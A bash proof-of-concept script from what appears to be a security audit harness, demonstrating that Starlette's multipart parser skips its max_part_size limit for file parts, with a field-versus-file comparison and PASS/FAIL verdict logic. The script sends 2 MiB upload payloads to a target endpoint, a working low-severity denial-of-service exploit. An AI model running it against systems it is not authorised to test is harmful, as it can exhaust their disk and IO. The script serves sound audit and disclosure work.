#!/usr/bin/env bash
# poc_10_multipart_size_bypass.sh — multipart max_part_size enforced for form
# fields but NOT for file parts (starlette/formparsers.py:183-188)
#
# ── Sink ─────────────────────────────────────────────────────────────────────
#   starlette/formparsers.py:181-188 (MultiPartParser.on_part_data):
#
#     def on_part_data(self, data, start, end):
#         message_bytes = data[start:end]
#         if self._current_part.file is None:           # NON-FILE field part
#             if len(...) + len(message_bytes) > self.max_part_size:
#                 raise MultiPartException("Part exceeded maximum size of {N}KB.")
#             self._current_part.data.extend(message_bytes)
#         else:                                          # FILE part (filename= present)
#             self._file_parts_to_write.append(...)      # NO size check — unbounded
#
#   Spill point: formparsers.py:230 — SpooledTemporaryFile(max_size=spool_max_size)
#   (spool_max_size = 1MB, line 147). Past 1MB the temporary file spills to disk.
#
# ── Source / data flow ───────────────────────────────────────────────────────
#   Multipart request body with a part carrying filename= in Content-Disposition
#     → starlette/formparsers.py:225 — on_headers_finished sees b"filename" in options
#     → self._current_part.file = UploadFile(file=SpooledTemporaryFile(...))
#     → on_part_data (line 187-188): else-branch — appended with NO size check
#     → SpooledTemporaryFile spills to disk past spool_max_size (1MB)
#     → FastAPI /upload endpoint: UploadFile.read() returns the full body
#
# ── Precondition (PROMINENT — do NOT overstate exploitability) ────────────────
#   Exploitable when:
#     (1) The app exposes an UploadFile / bytes=File() / raw request.form() endpoint.
#     (2) No upstream proxy body-size cap (e.g. nginx client_max_body_size) is in place.
#   The attacker also needs bandwidth to stream the body.
#   No proxy, no special headers, no middleware required beyond these conditions.
#
# ── Honest scope — NOT a str=Form() bypass ────────────────────────────────────
#   Adding filename= to a part aimed at a str=Form() field does NOT silently feed
#   oversized data to the app. Starlette stores an UploadFile in FormData for that
#   part; FastAPI's _extract_form_body does not coerce it (requires params.File, not
#   params.Form); Pydantic rejects an arbitrary UploadFile object against str — HTTP
#   422 type=string_type. Only genuine UploadFile/File() endpoints exhibit the spool.
#
# ── PASS/FAIL semantics (FINDING check — same convention as poc_07/poc_08/poc_09) ─
#   FAIL = confirmed finding (max_part_size asymmetry demonstrated live).
#   PASS = defense held or inconclusive (see verdict logic below).
#   THIS POC IS EXPECTED TO FAIL ON THIS COMMIT.
#   A FAIL from this PoC is the correct, valid audit output — it is NOT a
#   harness bug. run_all.sh prints "REAL FINDING DETECTED" on FAIL, which is
#   the intended behaviour for a confirmed security finding.
#
# ── Severity ─────────────────────────────────────────────────────────────────
#   LOW. Disk/IO resource-exhaustion (DoS) only. No RCE, no data disclosure, no
#   auth bypass. Gated on an upload endpoint existing and no proxy body cap.
#   "Uploads are unbounded by default; bound them at app/proxy" is broadly
#   by-design across web frameworks — the specific reportable nucleus here is the
#   SEMANTIC ASYMMETRY: a param literally named max_part_size silently does not
#   apply to the part that dominates resource use (the file part). This mirrors
#   the class of "configured form limits silently ignored" that starlette itself
#   fixed for urlencoded bodies in CVE-2026-54283 (starlette 1.3.1), present here.
#
# ── Independence from poc_07/poc_08/poc_09 ───────────────────────────────────
#   Source: multipart request BODY (file part) — distinct from poc_07/08
#           (X-Forwarded-Prefix header) and poc_09 (Host header).
#   Sink:   formparsers.py:188 SpooledTemporaryFile spool — distinct from
#           docs.py / applications.py / routing.py.
#   Class:  disk/IO resource DoS — distinct from XSS / URL-injection / open-redirect.
#   Fix-orthogonal both directions.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/pins.sh
source "${SCRIPT_DIR}/../lib/pins.sh"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

BASE_URL="${1:?Base URL required as \$1}"
UPLOAD_URL="${BASE_URL}/upload"

echo "=== poc_10: multipart max_part_size not enforced on file parts (formparsers.py:183-188) ==="
echo "Endpoint    : ${UPLOAD_URL}"
echo "Sink        : starlette/formparsers.py:183-188 (on_part_data skips max_part_size for file parts)"
echo "Spill point : starlette/formparsers.py:230 (SpooledTemporaryFile spills to disk past 1MB)"
echo "Severity    : LOW — disk/IO resource DoS; upstream-inherited; NOT a str=Form() bypass"
echo "Expected    : FAIL (field path rejects 2MiB; file path accepts 2MiB — asymmetry confirmed)"
echo ""

# Payload size: ~2 MiB — clearly exceeds the 1MB max_part_size cap.
PAYLOAD_SIZE=$((2 * 1024 * 1024))
# CRLF separator used in multipart framing.
CRLF=$'\r\n'
BOUNDARY="AFYNBOUNDARY10"

# ── Build the ~2MiB payload body (shared across both sends) ──────────────────
# Written to a temp file on the runner; streamed to curl via stdin (@-).
PAYLOAD_TMP="$(mktemp /tmp/poc10_payload.XXXXXX)"
# Produce exactly PAYLOAD_SIZE bytes of 'A'.
# Use python3 to generate the payload reliably — avoids shell portability
# concerns with head -c on some BSD variants and tr '\0' '\n' quoting.
python3 -c "import sys; sys.stdout.buffer.write(b'A' * ${PAYLOAD_SIZE})" > "${PAYLOAD_TMP}"

echo "Payload: ${PAYLOAD_SIZE} bytes of 'A' written to ${PAYLOAD_TMP}"
echo ""

# ── Teeth-test / positive control A: field path — MUST be rejected ───────────
# Send the 2MiB payload as a NON-FILE field part (no filename=).
# Starlette's on_part_data:183-186 checks max_part_size for field parts → 400.
# If this is NOT rejected, the cap is disabled in this environment and we cannot
# demonstrate the asymmetry → self-downgrade to PASS/inconclusive.
echo "--- Teeth-test (field path): POST 2MiB as form field (no filename) — expect 4xx rejection ---"

# Build the multipart body manually so Content-Disposition has no filename=.
# Raw multipart wire format: CRLF-terminated preamble; each part body after blank line.
# The printf writes the CRLF-framing headers; then the payload bytes; then the closing delimiter.
FIELD_BODY_TMP="$(mktemp /tmp/poc10_field_body.XXXXXX)"
{
    printf '%s' "--${BOUNDARY}${CRLF}"
    printf '%s' "Content-Disposition: form-data; name=\"file\"${CRLF}"
    printf '%s' "${CRLF}"
    cat "${PAYLOAD_TMP}"
    printf '%s' "${CRLF}--${BOUNDARY}--${CRLF}"
} > "${FIELD_BODY_TMP}"

FIELD_STATUS="$(curl -sS \
    -X POST \
    -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
    --data-binary "@${FIELD_BODY_TMP}" \
    -o /tmp/poc10_field_resp.txt \
    -w "%{http_code}" \
    --max-time 30 \
    "${UPLOAD_URL}" 2>&1 || echo "000")"
FIELD_BODY="$(cat /tmp/poc10_field_resp.txt 2>/dev/null || echo "")"

echo "HTTP status (field path): ${FIELD_STATUS}"
echo "Response body (field path): ${FIELD_BODY}"
echo ""

# Determine if field path was correctly rejected (4xx).
FIELD_REJECTED=0
if printf '%s\n' "${FIELD_STATUS}" | grep -qE '^4'; then
    FIELD_REJECTED=1
    echo "[OK] Teeth-test: 2MiB field part rejected with HTTP ${FIELD_STATUS} — max_part_size cap is active"
else
    echo "[WARN] Teeth-test: 2MiB field part was NOT rejected (HTTP ${FIELD_STATUS})."
    echo "       max_part_size cap not observed — cannot demonstrate asymmetry."
fi
echo ""

# ── Exploit: file path — expected ACCEPTED ────────────────────────────────────
# Send the same 2MiB payload as a FILE part (filename= present in Content-Disposition).
# Starlette's on_part_data:187-188 skips max_part_size for file parts → 200.
# The /upload endpoint reads the file and returns {"received_bytes": N}.
echo "--- Exploit (file path): POST 2MiB as file part (filename=x) — expect 200 + received_bytes=${PAYLOAD_SIZE} ---"

FILE_BODY_TMP="$(mktemp /tmp/poc10_file_body.XXXXXX)"
{
    printf '%s' "--${BOUNDARY}${CRLF}"
    printf '%s' "Content-Disposition: form-data; name=\"file\"; filename=\"x\"${CRLF}"
    printf '%s' "Content-Type: application/octet-stream${CRLF}"
    printf '%s' "${CRLF}"
    cat "${PAYLOAD_TMP}"
    printf '%s' "${CRLF}--${BOUNDARY}--${CRLF}"
} > "${FILE_BODY_TMP}"

FILE_STATUS="$(curl -sS \
    -X POST \
    -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
    --data-binary "@${FILE_BODY_TMP}" \
    -o /tmp/poc10_file_resp.txt \
    -w "%{http_code}" \
    --max-time 30 \
    "${UPLOAD_URL}" 2>&1 || echo "000")"
FILE_BODY="$(cat /tmp/poc10_file_resp.txt 2>/dev/null || echo "")"

echo "HTTP status (file path): ${FILE_STATUS}"
echo "Response body (file path): ${FILE_BODY}"
echo ""

FILE_ACCEPTED=0
if printf '%s\n' "${FILE_STATUS}" | grep -qE '^200'; then
    # Assert the EXACT received_bytes value matches the payload size.
    # Use a specific substring that includes the full integer to avoid matching
    # a partial number (e.g. "2097" matching a truncated "209715" would false-pass).
    EXPECTED_BYTES_STR="\"received_bytes\":${PAYLOAD_SIZE}"
    if assert_contains "${FILE_BODY}" "${EXPECTED_BYTES_STR}"; then
        FILE_ACCEPTED=1
        echo "[OK] Exploit: 2MiB file part accepted (HTTP 200), full body materialized (received_bytes=${PAYLOAD_SIZE})"
        echo "     Server spooled the full >1MB payload — max_part_size NOT enforced for file parts."
        echo "     Sink: starlette/formparsers.py:187-188 (else-branch, no size check)"
    else
        echo "[INFO] Exploit: HTTP 200 but received_bytes mismatch — body: ${FILE_BODY}"
    fi
else
    echo "[INFO] Exploit: file part returned HTTP ${FILE_STATUS} — not 200; file also rejected or error."
fi
echo ""

# Clean up temp files.
rm -f "${PAYLOAD_TMP}" "${FIELD_BODY_TMP}" "${FILE_BODY_TMP}"

# ── Verdict logic ─────────────────────────────────────────────────────────────
echo "--- Verdict ---"

if (( FIELD_REJECTED == 1 )) && (( FILE_ACCEPTED == 1 )); then
    # Both arms of the asymmetry confirmed: field rejected, file accepted in full.
    print_check "multipart_filepart_size_uncapped" "FAIL" \
        "max_part_size enforced for form fields (2MiB field rejected HTTP 4xx) but NOT for file parts (2MiB file accepted HTTP 200 received_bytes=${PAYLOAD_SIZE}) — formparsers.py:183-188; LOW severity upstream-inherited disk/IO DoS; NOT a str=Form() bypass (422 on type mismatch)"

elif (( FIELD_REJECTED == 0 )); then
    # Field was not rejected — cannot prove the asymmetry.
    print_check "multipart_filepart_size_uncapped" "PASS" \
        "inconclusive: field-size cap (max_part_size) not observed active in this environment (2MiB field not rejected); cannot demonstrate asymmetry between field and file parts"

else
    # Field was rejected but file was also rejected (or accepted with wrong byte count).
    print_check "multipart_filepart_size_uncapped" "PASS" \
        "file part also size-capped or response mismatch (HTTP ${FILE_STATUS}); asymmetry not observed in this environment (contradicts static source read of formparsers.py:187-188)"
fi
